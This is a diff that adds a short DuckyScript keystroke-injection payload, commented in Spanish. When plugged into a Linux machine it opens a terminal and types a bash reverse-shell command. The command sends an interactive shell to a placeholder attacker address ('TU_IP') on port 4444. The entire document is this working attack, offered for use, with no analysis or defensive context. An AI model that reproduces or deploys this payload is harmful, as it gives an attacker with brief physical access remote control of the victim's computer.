@@ -1,0 +1,7 @@
+REM Payload para abrir una reverse shell en Linux
+DELAY 500
+CTRL ALT t                                REM Abre una terminal en Linux
+DELAY 500
+
+STRING bash -i >& /dev/tcp/TU_IP/4444 0>&1
+ENTER
